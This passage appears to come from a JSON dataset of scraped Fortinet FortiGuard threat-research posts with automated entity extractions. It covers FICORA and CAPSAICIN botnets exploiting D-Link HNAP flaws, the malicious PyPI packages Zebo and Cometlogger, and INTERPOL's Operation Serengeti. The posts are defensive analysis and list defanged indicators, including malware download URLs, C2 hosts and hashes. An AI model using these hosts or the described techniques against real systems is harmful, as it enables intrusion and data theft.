efficacy. Cloud detection and response(CDR) is a crucial component in addressing cloud identity compromises such as the one documented here. With over 80% of attacks in the cloud involving compromised credentials, the effectiveness of your CDR solution can directly dictate the severity of a cloud attack.Lacework FortiCNAPPoffers comprehensive CDR protection with our innovative composite alerting technology. Cloud identity compromises can be difficult to isolate as they often blend in with legitimate activity. Lacework FortiCNAPP can evaluate numerous weak signals together through composite alerting, culminating in a much higher detection efficacy than point detection alone. Lacework FortiCNAPP also integrates other essential components, such asCIEMfor informing the blast-radius of a compromised identity. Read moreabout how Lacework FortiCNAPP can secure your cloud environment. cloud security Business and Technology Partners Business and Technology Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Organization), (EC2 Grouper, Attacker), (AWS tools, Tool), (AWSPowerShell.Common/4.1.90.0, Tool), (NET_Core/6.0.5, Tool), (OS/Microsoft_Windows_10.0.17763, Tool), (PowerShellCore/7.-1, Tool), (ClientAsync, Tool), (AWSPowerShell.Common/4.1.534.0, Tool), (user agent, UserAgent), (unusual # characters, Character), (Detection countermeasure, DetectionCountermeasure)\nRelationships: (FortiGuard Labs Threat Research, analyzes, identity compromises), (EC2 Grouper, uses, AWS tools), (EC2 Grouper, uses, AWSPowerShell.Common/4.1.90.0), (EC2 Grouper, uses, NET_Core/6.0.5), (EC2 Grouper, uses, OS/Microsoft_Windows_10.0.17763), (EC2 Grouper, uses, PowerShellCore/7.-1), (EC2 Grouper, uses, ClientAsync), (EC2 Grouper, uses, AWSPowerShell.Common/4.1.534.0), (EC2 Grouper, uses, user agent),",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Organization"
        ],
        [
          "EC2 Grouper",
          "Attacker"
        ],
        [
          "AWS tools",
          "Tool"
        ],
        [
          "AWSPowerShell.Common/4.1.90.0",
          "Tool"
        ],
        [
          "NET_Core/6.0.5",
          "Tool"
        ],
        [
          "OS/Microsoft_Windows_10.0.17763",
          "Tool"
        ],
        [
          "PowerShellCore/7.-1",
          "Tool"
        ],
        [
          "ClientAsync",
          "Tool"
        ],
        [
          "AWSPowerShell.Common/4.1.534.0",
          "Tool"
        ],
        [
          "user agent",
          "UserAgent"
        ],
        [
          "unusual # characters",
          "Character"
        ],
        [
          "Detection countermeasure",
          "DetectionCountermeasure"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "analyzes",
          "identity compromises"
        ],
        [
          "EC2 Grouper",
          "uses",
          "AWS tools"
        ],
        [
          "EC2 Grouper",
          "uses",
          "AWSPowerShell.Common/4.1.90.0"
        ],
        [
          "EC2 Grouper",
          "uses",
          "NET_Core/6.0.5"
        ],
        [
          "EC2 Grouper",
          "uses",
          "OS/Microsoft_Windows_10.0.17763"
        ],
        [
          "EC2 Grouper",
          "uses",
          "PowerShellCore/7.-1"
        ],
        [
          "EC2 Grouper",
          "uses",
          "ClientAsync"
        ],
        [
          "EC2 Grouper",
          "uses",
          "AWSPowerShell.Common/4.1.534.0"
        ],
        [
          "EC2 Grouper",
          "uses",
          "user agent"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 9
  },
  {
    "title": "Botnets Continue to Target Aging D-Link Vulnerabilities",
    "link": "https://www.fortinet.com/blog/threat-research/botnets-continue-to-target-aging-d-link-vulnerabilities",
    "content": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlier. D-Link DIR-806 devices. D-Link GO-RT-AC750 GORTAC750_revA_v101b03 and GO-RT-AC750_revB_FWv200b02. D-Link DIR-845L router v1.01KRb03 and beforeImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs noticed a spike in the activity of two different botnets in October and November of 2024. One was the Mirai variant “FICORA,” and the other was the Kaiten variant “CAPSAICIN.” These botnets are frequently spread through documented D-Link vulnerabilities that allow remote attackers to execute malicious commands via a GetDeviceSettings action on the HNAP (Home Network Administration Protocol) interface. This HNAP weakness was first exposed almost a decade ago, with numerous devices affected by a variety of CVE numbers, including CVE-2015-2051, CVE-2019-10891, CVE-2022-37056, and CVE-2024-33112. According to our IPS telemetry, attackers frequently reuse older attacks, which accounts for the continued spread of the “FICORA” and “CAPSAICIN” botnets to victim hosts and infected targets. This article looks at their infected traffic and offers insights into these botnets. The attackers we identified spreading the “FICORA” botnet triggered the incident from 185[.]191[.]126[.]213 and 185[.]191[.]126[.]248, which are servers located in the Netherlands. Because this latest “FICORA” attack targeted many countries around the world, we speculate that this was not a targeted attack. “CAPSAICIN,” unlike “FICORA,” was only intensely active over two days—October 21 and 22, 2024. East Asian countries bore the brunt of those incidents by attackers actively spreading the “CAPSAICIN” botnet. The “FICORA” botnet downloads a shell script named “multi,” executes the script, and then removes it after execution. The shell script “multi” uses multiple strategies to download the malware “FICORA,” such as “wget,” “ftpget,” “curl,” and “tftp.” This downloader script first kills all processes with the same file extension as the malware “FICORA.” It then downloads and executes its various malware by targeting different Linux architectures, including “arc,” “arm,” “arm5,” “arm6,” “arm7,” “i486,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “powerpc,” “powerpc-440fp,” and “sparc.” The following analysis is based on “la.bot.arm7.” “FICORA” encodes its configuration with the ChaCha20 encryption algorithm. This configuration includes its C2 server domain and a unique string. The scanner in “FICORA” includes a hard-coded username and password for its brute force attack function. The malware also embeds a shell script with hexadecimal ASCII characters and constructs it during the scanner's execution. The shell script tries to identify any process containing the keyword “dvrHelper,” which is probably another malware and kills it. The malware “FICORA” is a variant of the Mirai malware. It can be identified by its similar architecture.It also includes DDoS attack functions using protocols like “UDP,” “TCP,” and “DNS.” The malware “CAPSAICIN”’s downloader is delivered from 87[.]10[.]220[.]221. The shell script “bins.sh” downloads and executes the malware “CAPSAICIN” with prefix file name “yakuza” targeting different Linux architectures, including “arm,” “arm5,” “arm6,” “arm7,” “i586,” “i686,” “m68k,” “mips,” “mipsel,” “ppc,” “sparc,” and “x86.” We will focus on “yakuza.x86” for the following analysis. Once we execute the malware, it pops up the string “CAPSAICIN” where the malware variant name is given. The malware kills known botnet processes to ensure it is the only botnet executing on the victim host. “CAPSAICIN” establishes a connection socket with its C2 server, “192[.]110[.]247[.]46,” and sends the victim host’s OS information and the nickname given by the malware back to the C2 server. It waits for a command from the C2 server to execute numerous functions listed below. Using its “PRIVMSG” function, “CAPSAICIN” sets up environment variables for more functions the C2 server can conduct using the following commands. In addition to the above commands, the “PRIVMSG” function can trigger DDoS attacks using the following commands from the C2 server. In addition to these attack functions, the malware includes a help message for each function to remind the attacker of needed parameters. The malware “CAPSAICIN” seems to be a variant based on the Keksec group’s botnets. According to hard-coded information found in version 17.0.0 of the malware developed by the Keksec group, we surmise that “CAPSAICIN” was developed based on that version. Although the weaknesses exploited in this attack had been exposed and patched nearly a decade ago, these attacks have remained continuously active worldwide. FortiGuard Labs discovered that “FICORA” and “CAPSAICIN” spread through this weakness. Because of this, it is crucial for every enterprise to regularly update the kernel of their devices and maintain comprehensive monitoring. These steps will help reduce the likelihood of malware being deployed through this vulnerability. The malware described in this report is detected and blocked byFortiGuard Antivirusas: ELF/Gafgyt.ST!trELF/Gafgyt.C!trELF/Gafgyt.AEA!trBASH/TrojanDownloader.SH!trBASH/Mirai.AEH!tr.dldrELF/Mirai.A!trELF/Mirai.CTQ!trELF/Mirai.CLY!trBASH/Agent.SHS!tr.dldr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities: CVE-2015-2051: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2019-10891: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2022-37056: D-Link.Devices.HNAP.SOAPAction-Header.Command.ExecutionCVE-2024-33112: D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://103[.]149[.]87[.]69/multihxxp://103[.]149[.]87[.]69/la.bot.archxxp://103[.]149[.]87[.]69/la.bot.armhxxp://103[.]149[.]87[.]69/la.bot.arm5hxxp://103[.]149[.]87[.]69/la.bot.arm6hxxp://103[.]149[.]87[.]69/la.bot.arm7hxxp://103[.]149[.]87[.]69/la.bot.m68khxxp://103[.]149[.]87[.]69/la.bot.mipshxxp://103[.]149[.]87[.]69/la.bot.mipselhxxp://103[.]149[.]87[.]69/la.bot.powerpchxxp://103[.]149[.]87[.]69/la.bot.sh4hxxp://103[.]149[.]87[.]69/la.bot.sparc hxxp://87[.]11[.]174[.]141/bins.shhxxp://pirati[.]abuser[.]eu/yakuza.yak.shhxxp://pirati[.]abuser[.]eu/yakuza.arm5hxxp://pirati[.]abuser[.]eu/yakuza.arm6hxxp://pirati[.]abuser[.]eu/yakuza.arm7hxxp://pirati[.]abuser[.]eu/yakuza.i586hxxp://pirati[.]abuser[.]eu/yakuza.i686hxxp://pirati[.]abuser[.]eu/yakuza.m68khxxp://pirati[.]abuser[.]eu/yakuza.mipshxxp://pirati[.]abuser[.]eu/yakuza.mipselhxxp://pirati[.]abuser[.]eu/yakuza.ppchxxp://pirati[.]abuser[.]eu/yakuza.sparchxxp://pirati[.]abuser[.]eu/yakuza.x86hxxp://87[.]10[.]220[.]221/bins.shhxxp://87[.]10[.]220[.]221/yakuza.shhxxp://87[.]10[.]220[.]221/yakuza.arm4hxxp://87[.]10[.]220[.]221/yakuza.arm5hxxp://87[.]10[.]220[.]221/yakuza.arm6hxxp://87[.]10[.]220[.]221/yakuza.arm7hxxp://87[.]10[.]220[.]221/yakuza.i586hxxp://87[.]10[.]220[.]221/yakuza.i686hxxp://87[.]10[.]220[.]221/yakuza.m68khxxp://87[.]10[.]220[.]221/yakuza.mipshxxp://87[.]10[.]220[.]221/yakuza.mipselhxxp://87[.]10[.]220[.]221/yakuza.ppchxxp://87[.]10[.]220[.]221/yakuza.sparchxxp://87[.]10[.]220[.]221/yakuza.x86 103[.]149[.]87[.]69ru[.]coziest[.]lolf[.]codingdrunk[.]ccwww[.]codingdrunk[.]ineighteen[.]piratenineteen[.]libre75cents[.]libre2joints[.]librefortyfivehundred[.]dyn21savage[.]dynimaverygoodbadboy[.]librele[.]codingdrunk[.]in87[.]11[.]174[.]141pirati[.]abuser[.]eu87[.]10[.]220[.]22145[.]86[.]86[.]60194[.]110[.]247[.]46 f71dc58cc969e79cb0fdfe5163fbb9ed4fee5e13cc9407a11d231601ee4c6e23ea83411bd7b6e5a7364f7b8b9018f0f17f7084aeb58a47736dd80c99cfeac7f148a04c7c33a787ef72f1a61aec9fad87d6bd9c49542f52af7e029ac83475f45d18c92006951f93a77df14eca6430f32389080838d97c9e47364bf82f6c21a907 9b161a32d89f9b19d40cd4c21d436c1daf208b5d159ffe1df7ad5fd1a57610e5faeea9d5091384195e87caae9dd88010c9a2b3b2c88ae9cac8d79fd94f250e9f10d7aedc963ea77302b967aad100d7dd90d95abcdb099c5a0a2df309c52c32b87f6912de8bef9ced5b9018401452278570b4264bb1e935292575f2c3a0616ec4a06fd0b8936f5b2370db5f7ec933d53bd8a1bf5042cdc5c052390d1ecc7c0e07764a03bf28f9eec50a1bd994308e977a64201fbe5d41337bdcc942c74861bcd3df176fb8cfbc7512c77673f862e73833641ebb0d43213492c168f99302dcd5e3ac2df391ede03df27bcf238077d2dddcde24cd86f16202c5c51ecd31b7596a68ca3f6dce945ccad5a50ea01262b2d42171f893632fc5c5b8ce4499990e978e5bafee245b6f999f6b9d0dd997436df5f2abfb3c8d2a8811ff57e3c21637207d62ec508df7cb142a639b0c33f710d5e49c29a5a578521b6306bee28012aadde4a8 CAPSAICIN 8349ba17f028b6a17aaa09cd17f1107409611a0734e06e6047ccc33e8ff669b0b3ad8409d82500e790e6599337abe4d6edf5bd4c6737f8357d19edd82c88b064ec87dc841af77ec2987f3e8ae316143218e9557e281ca13fb954536aa9f9caf1784c9711eadceb7fedf022b7d7f00cff7a75d05c18ff726e257602e3a3ccccc1bde6ef047e0880ac7ef02e56eb87d5bc39116e98ef97a5b1960e9a55cea5082bc7be8d1b8948e1cb095d46376ced64367718ed2d9270c2fc99c7052a9d1ffed74600703535e35b464f0198a1fa95e3668a0c956ab68ce7b719c28031d69b86ff6e3ef9404817e168c974000205b27723bc93abd7fbf0581c16bb5d2e1c5c6e4a32e66b87f47245a892b102b7141d3845540b270c278e221f502807758a4e5dee540c00e6c0b53332128b605b0d5e0926db0560a541bb13448d094764844763dfb74dbd02b7ebb51700f3c5900283e46570fe497f9b415d25a029623118073519148f6b990fc1f1903287cd5c20276664b332dd3ba8d58f2bf8c26334c93c3af5464e2f1faab2a40db44f118f7c3d1f9b300297fe6ced83fabe87563fc82efe95b699cd64b9895cdcc325d7dd96c9eca623d3ec0247d20f39323547132c8fa63b1007f5613a91a5d4170f28e24bfa704c8a63d95a2b4d033ff2bff7e2fe3dcffe7a815d4ca3771de8a71cde2bdacf951bf48ea5854eb0a2af5db7d13ad51c44abd6a2a22000d68d79caeae482d8cf092c2d84d55dccee05e179a961c72f77b1ba7ab36a93f009058e60c8a45b900c1c7ae38c96005a43a39e45be9dc7af9d6da8803abfe19cdc6c0c41acfeb210a2361cab96d5926b2c43e5eb3b589a6ed189ad7b29053306f194ca75021952f97f894d8eae6d2e1d02939df37b62d3845bfdb759704cf55b9fa439d6f7a36821a50178e9d73ddc5407ff340460c054d7defc54aaa49b7b4f1e71623c42bc77bb7aa40534bcb7312da511b041799bf0e1a63ee71ca1d5a53c4379c3015c74af2b18c1d9285ac1a48d515f9b7827e4f900a61bde botnets FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Mirai, Malware), (Kaiten, Malware), (HNAP, Tool), (CVE-2015-2051, Vulnerability), (CVE-2019-10891, Vulnerability), (CVE-2022-37056, Vulnerability), (CVE-2024-33112, Vulnerability), (D-Link DIR-645 Wired/Wireless Router Rev. Ax, Device), (D-Link DIR-806, Device), (D-Link GO-RT-AC750 GORTAC750_revA_v101b03, Device), (GO-RT-AC750_revB_FWv200b02, Device), (D-Link DIR-845L router v1.01KRb03, Device), (FICORA, Botnet), (CAPSAICIN, Botnet), (185.191.126.213, IP), (185.191.126.248, IP)\nRelationships: (FortiGuard Labs, notices, Mirai variant \"FICORA\"), (FortiGuard Labs, notices, Kaiten variant \"CAPSAICIN\"), (Fort",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Mirai",
          "Malware"
        ],
        [
          "Kaiten",
          "Malware"
        ],
        [
          "HNAP",
          "Tool"
        ],
        [
          "CVE-2015-2051",
          "Vulnerability"
        ],
        [
          "CVE-2019-10891",
          "Vulnerability"
        ],
        [
          "CVE-2022-37056",
          "Vulnerability"
        ],
        [
          "CVE-2024-33112",
          "Vulnerability"
        ],
        [
          "D-Link DIR-645 Wired/Wireless Router Rev. Ax",
          "Device"
        ],
        [
          "D-Link DIR-806",
          "Device"
        ],
        [
          "D-Link GO-RT-AC750 GORTAC750_revA_v101b03",
          "Device"
        ],
        [
          "GO-RT-AC750_revB_FWv200b02",
          "Device"
        ],
        [
          "D-Link DIR-845L router v1.01KRb03",
          "Device"
        ],
        [
          "FICORA",
          "Botnet"
        ],
        [
          "CAPSAICIN",
          "Botnet"
        ],
        [
          "185.191.126.213",
          "IP"
        ],
        [
          "185.191.126.248",
          "IP"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "notices",
          "Mirai variant \"FICORA\""
        ],
        [
          "FortiGuard Labs",
          "notices",
          "Kaiten variant \"CAPSAICIN\""
        ]
      ],
      "has_entities": true
    },
    "entity_count": 17,
    "relationship_count": 2
  },
  {
    "title": "Analyzing Malicious Intent in Python Code: A Case Study",
    "link": "https://www.fortinet.com/blog/threat-research/analyzing-malicious-intent-in-python-code",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High Fortinet's AI-driven OSS malware detection system recently identified two malicious packages: Zebo-0.1.0 on November 16, 2024, and Cometlogger-0.1 on November 24, 2024. Malicious software often masquerades as legitimate code, hiding its harmful features behind complex logic and obfuscation. In this analysis, we examine the Python scripts behind these two packages, outline their malicious behaviors, and provide insights into their potential impact. The Zebo-0.1.0 script is a typical example of malware, with functions designed for surveillance, data exfiltration, and unauthorized control. It uses libraries like pynput and ImageGrab, along with obfuscation techniques, indicating clear malicious intent. The Cometlogger-0.1 script also shows signs of malicious behavior, including dynamic file manipulation, webhook injection, stealing information, and anti-VM checks. Zebo-0.1.0 is structured to perform various tasks that violate user privacy and security. Its main components include: Obfuscation:bypass detection mechanismsKeylogging:Capturing every keystroke typed by the user.Screen Capturing:Periodic screenshots of the user's desktop.Data Exfiltration:Uploading sensitive information (keystrokes, screenshots, etc.) to a remote server.Persistence Mechanism:Ensuring the malware re-executes upon system startup. Using obfuscation intentionally hides the true functionality, making it harder for users or security systems to understand what the code is doing. In this example, if the script or its components are obfuscated, it could hide malicious behavior, such as unauthorized data collection or system manipulation. Obfuscation can also be used to bypass security measures, potentially allowing malware to run undetected, which poses serious risks to both the user’s privacy and system integrity. The code uses hex-encoded strings (e.g., \\x68\\x74\\x74...) to hide the URL of the server it communicates with. It employs a command and control mechanism via HTTP requests to a remote server, which is used to manage the malware's behavior and collect stolen data.This obfuscation is a clear sign of malicious intent, as it seeks to bypass detection mechanisms during code review or automated scans. The use of the pynput library enables the script to log every keystroke made by the user. This feature is implemented through the following functions: Screen capturing can secretly record the user's screen, potentially violating their privacy and leading to unauthorized access to sensitive information. In the provided code, the post-installation script could be used to implement such functionality, allowing an attacker to monitor the user's activities without their consent. This is considered malicious behavior, as it can be used to steal personal information or perform other harmful actions, and it can lead to significant security risks, including data breaches and legal consequences. Using data exfiltration in this code is dangerous because it involves secretly collecting and transferring sensitive data from the user's system without their knowledge or consent. The post-installation script (i_am_cute()) can be used for unauthorized data access, potentially sending private information to a remote server. This could violate privacy, compromise security, and result in legal consequences for the software developer or distributor if the behavior is discovered, as it may be seen as a form of hacking or data theft. Logs and screenshots are sent to a Firebase database, exposing the user’s sensitive data to unauthorized parties. This is executed through HTTP PUT requests: To ensure it runs every time the system starts, the malware: The code provided raises several red flags indicative of potential malicious activity. Webhook Manipulation:The code dynamically requests a \"webhook\" from the user and embeds it into Python files like `Comet.py` and `Exela.py.’Information Theft:Steals tokens, passwords, and accounts from various platforms (Discord, Steam, Instagram, Twitter, etc.)Anti-VM Detection:Virtualization environments to evade analysis or sandboxing.Dynamic File Modification:The scripts modify Python files at runtime, a method that can enable malicious code injection for exploitation during execution.Persistence:Maintain long-term presence on the victim’s system. Security Risks: Injecting a webhook URL directly into the code allows for potential manipulation by unauthorized users, opening the door to malicious attacks. If attackers alter the webhook URL, it could redirect sensitive data to malicious servers, compromising security. Data Integrity: Allowing dynamic changes to webhooks during runtime can result in unintentional modifications, leading to incorrect or inconsistent data being sent. This could affect the system's functionality and lead to miscommunication between services. Malicious Exploitation: By hardcoding the webhook injection in multiple places, this approach can be exploited to execute malicious code. Since the code can be easily modified and reused, attackers could send harmful payloads through the webhook, potentially damaging systems or stealing data. The script repeatedly prompts users for a webhook, dynamically injecting it into files Injected webhooks could: Send sensitive information to a remote server. Facilitate command-and-control (C2) operations, allowing an attacker to issue commands remotely. The script from comet.py poses significant risks by violating user privacy through the collection of saved passwords, session cookies, and browsing history, which can be exploited to impersonate users, steal financial data, or compromise accounts. For organizations, this malware threatens unauthorized access to corporate accounts and data breaches, potentially leading to severe legal and financial consequences. Additionally, by targeting cookies from platforms like Instagram, TikTok, and Twitter, it enables account hijacking for spam, scams, or identity theft. Attackers often use anti-VM techniques to identify if their code is running in a sandbox or virtual machine, commonly used by researchers or security tools.The code checks for common virtualization indicators such as \"VMware\" and \"VirtualBox\".If such indicators are found, the code terminates execution to avoid detection.This allows attackers to bypass security monitoring in controlled environments. The Fake Error Message can trick users into running the malware code. Security Concerns: The code modifies files based on user inputs, potentially altering sensitive data like webhooks. This opens the door for malicious exploitation if an attacker provides malicious input or manipulates the file content. Data Integrity Risks: The use of replace operations without validation can lead to unintentional changes or corruption of files, especially if the files are being used by other processes or applications concurrently. Malware Risks: The integration with UPX, which compresses executables, raises concerns regarding the execution of malicious code. The UPX tool is commonly used to obfuscate malware, making it harder for security tools to detect it. The code modifies external files (Comet.py and Exela.py) without verifying their content or purpose: Security Risks: UPX can obfuscate the code, making it harder for security tools to analyze the executable. This could lead to undetected malicious behavior if used in malicious software. Compatibility Issues: UPX compression might cause problems with certain antivirus software or system configurations, as some security tools may flag compressed executables as suspicious, leading to false positives. Performance Impact: While UPX reduces file size, the decompression at runtime could introduce delays, affecting the performance of the application, especially if it's used excessively in critical areas of the code. The frequent invocation of utils/upx.exe using subprocess.call is highly suspicious: Continuous exception loops can lead to several problems, such as consuming excessive CPU resources, causing system freezes, and degrading performance. They may also obscure the root cause of the issue, making debugging more difficult. If exceptions are raised without proper handling, the program becomes unresponsive and harder to maintain. The script employs an infinite loop to persist in the user's environment: Disconnect from the Internet: Immediately isolate the infected system to prevent further data exfiltration. Run Antivirus Tools: Use reputable antivirus software to detect and remove the malware. Reformat the System: If the infection persists, reformat the system and reinstall the OS. Code Review: Always verify third-party scripts and executables before running them. Network Monitoring: Implement firewalls and intrusion detection systems to identify suspicious network activity. Education: Train users to recognize phishing attempts and avoid executing unverified scripts. This malicious Python script (Zebo-0.1.0) is a textbook example of malware, exhibiting functionalities designed for surveillance, data exfiltration, and unauthorized control. Its sophisticated use of libraries like pynput and ImageGrab, coupled with obfuscation techniques, demonstrates a clear intent to harm or exploit users. Such scripts highlight the importance of cybersecurity awareness and robust defensive measures. The script (Cometlogger-0.1) exhibits several hallmarks of malicious intent, including dynamic file manipulation, webhook injection, steal information, ANTI-VM. While some features could be part of a legitimate tool, the lack of transparency and suspicious functionality make it unsafe to execute. Always scrutinize code before running it and avoid interacting with scripts from unverified sources. FortiGuard AntiVirusdetects the malicious files identified in this report as zebo_0.1.0: Python/Agent.BZ!trrunner.py:Python/Agent.BZ!trCometlogger_0.1: Python/Agent.APQ!trcomet.py: Python/Agent.APQ!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Package/file name Sha256 Detection Zebo_0.1.0 4aeb0211bd6d9e7c74c09ac67812465f2a8e90e25fe04b265b7f289deea5db21 Python/Agent.BZ!tr zebo_0.1.0/runner.py 4aeb0211bd6d9e7c74c09ac67812465f2a8e90e25fe04b265b7f289deea5db21 Python/Agent.BZ!tr cometlogger_0.1 839d0cfcc52a130add70239b943d8c82c4234b064d6f996eeaae142f05cc9e85 Python/Agent.APQ!tr cometlogger_0.1/comet.py e01c61dc52514b011c83c293cf19092c40cb606a28a87675b4f896be5afebed2 Python/Agent.APQ!tr python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Zebo-0.1.0, Malware), (Cometlogger-0.1, Malware), (pynput, Tool), (ImageGrab, Tool), (Obfuscation, Technique), (Keylogging, Technique), (Screen Capturing, Technique), (Data Exfiltration, Technique), (Webhook Injection, Technique), (Anti-VM Checks, Technique), (Python scripts, File), (keystrokes, Data), (screenshots, Data), (sensitive information, Data)\\nRelationships: (FortiGuard Labs Threat Research, affectedPlatforms, All platforms), (FortiGuard Labs Threat Research, impactedParties, Any individuals or institutions), (FortiGuard Labs Threat Research, impact, Leak of credentials, sensitive information, etc.), (FortiGuard Labs Threat Research, severityLevel, High), (FortiGuard Labs Threat Research, detectedBy, Fortinet's AI-driven OSS malware detection system), (FortiGuard Labs Threat Research, identified, Zebo-0.1.0), (FortiGuard Labs Threat Research, identified, Cometlogger-0.1), (Zebo-0.1.0, malwarescript, True), (Zebo-0.1.0, uses, pynput), (Zebo-0.1.0, uses, ImageGrab), (Zebo-0.1.0",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Zebo-0.1.0",
          "Malware"
        ],
        [
          "Cometlogger-0.1",
          "Malware"
        ],
        [
          "pynput",
          "Tool"
        ],
        [
          "ImageGrab",
          "Tool"
        ],
        [
          "Obfuscation",
          "Technique"
        ],
        [
          "Keylogging",
          "Technique"
        ],
        [
          "Screen Capturing",
          "Technique"
        ],
        [
          "Data Exfiltration",
          "Technique"
        ],
        [
          "Webhook Injection",
          "Technique"
        ],
        [
          "Anti-VM Checks",
          "Technique"
        ],
        [
          "Python scripts",
          "File"
        ],
        [
          "keystrokes",
          "Data"
        ],
        [
          "screenshots",
          "Data"
        ],
        [
          "sensitive information",
          "Data"
        ],
        [
          "FortiGuard Labs Threat Research",
          "affectedPlatforms",
          "All platforms"
        ],
        [
          "FortiGuard Labs Threat Research",
          "impactedParties",
          "Any individuals or institutions"
        ],
        [
          "FortiGuard Labs Threat Research",
          "impact",
          "Leak of credentials",
          "sensitive information",
          "etc."
        ],
        [
          "FortiGuard Labs Threat Research",
          "severityLevel",
          "High"
        ],
        [
          "FortiGuard Labs Threat Research",
          "detectedBy",
          "Fortinet's AI-driven OSS malware detection system"
        ],
        [
          "FortiGuard Labs Threat Research",
          "identified",
          "Zebo-0.1.0"
        ],
        [
          "FortiGuard Labs Threat Research",
          "identified",
          "Cometlogger-0.1"
        ],
        [
          "Zebo-0.1.0",
          "malwarescript",
          "True"
        ],
        [
          "Zebo-0.1.0",
          "uses",
          "pynput"
        ],
        [
          "Zebo-0.1.0",
          "uses",
          "ImageGrab"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 25,
    "relationship_count": 0
  },
  {
    "title": "Fortinet Contributes to Major Cybercrime Operation Arrests",
    "link": "https://www.fortinet.com/blog/threat-research/fortinet-contributes-to-major-cybercrime-operation-arrests",
    "content": "FortiGuard Labs Threat Research Earlier this week, the International Criminal Police Organization (INTERPOL) and the African Union Mechanism for Police Cooperation (AFRIPOL)announcedthat the organizations have identified and arrested members of cybercrime groups operating across Africa. These individuals specialize in ransomware, digital extortion, online scams, and business email compromise (BEC) attacks. INTERPOL and AFRIPOL activities related to this effort, called Operation Serengeti, were supported by numerous partners, including Fortinet, and research from theCybercrime Atlas. The Cybercrime Atlas is a collaboration initiated by the World Economic Forum’sPartnership Against Cybercrime, in which cybercrime experts use open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. Fortinet is a launch partner of the Cybercrime Atlas, which has been in operation for a year. Separately, Fortinet, a longtime INTERPOL partner, was named a private contributing partner in Operation Serengeti for playing a vital role in sharing intelligence, supporting analysis, and disrupting criminal activities. As a result of Operation Serengeti, authorities across 19 participating countries arrested 1,006 suspects and dismantled nearly 135,000 malicious infrastructures and networks. The arrests follow months of international police collaboration, acting on information initially shared by partners, including the Cybercrime Atlas. This most recent effort identified and monitored these threat actors, leading to the arrests. Information provided by participating countries of ongoing cases with INTERPOL fed into 65 cyber analytical reports to ensure actions on the ground were intelligence-led and focused on the most significant actors. Seven private sector partners also played a vital role by sharing intelligence, supporting analysis, and disrupting criminal activities. These partners provided on-site support and offered around-the-clock remote assistance to patch vulnerabilities and secure critical infrastructure for the participating member countries. Operation Serengeti disrupted: These cybercrime operations resulted in a combined monetary loss of almost $193 million among numerous victims. The Cybercrime Atlas, which became operational earlier this year, was created to drive real impact and a coordinated effort to create a chain of disruption in the world of cybercrime. It will enable the entire cybersecurity community to become more resilient and effective at stopping cybercrime on a global scale. The Cybercrime Atlas comprises experts using open-source research to map cybercriminal activities and identify joint public and private sector responses to cybercrime. The group’s members currently include more than 20 law enforcement agencies, private-sector security companies, and incident responders, non-governmental organizations, financial institutions, and academic partners. In itsfirst year of operation, Cybercrime Atlas contributors shared more than 10,000 community-vetted and actionable data points and supported two cross-border cybercrime disruption efforts. They created seven comprehensive intelligence packages on emerging threats that were shared with law enforcement so that this actionable data could be operationalized. These intelligence packages created by Cybercrime Atlas contributed directly to the success of Operation Serengeti. Fortinet has been a trusted partner to INTERPOL since 2015, and officially became an INTERPOL Gateway partner in 2018. This ongoing collaboration has resulted in greater threat intelligence standards and protocols implemented across the industry and impactful global cybercriminal takedowns and disrupting criminal activities. In 2022,FortiGuard Labsprovided evidentiary support toINTERPOLand African Member countries as part of theAfrica Cyber Surge Operation(ASCO) to help detect, investigate, and disrupt cybercrime through coordinated law enforcement activities, utilizing INTERPOL platforms, tools, and channels in close cooperation with AFRIPOL. As a part of that effort, FortiGuard Labs provided actionable threat intelligence over six months, consisting ofbotnet,command and control (C2), andmalwareinfrastructure 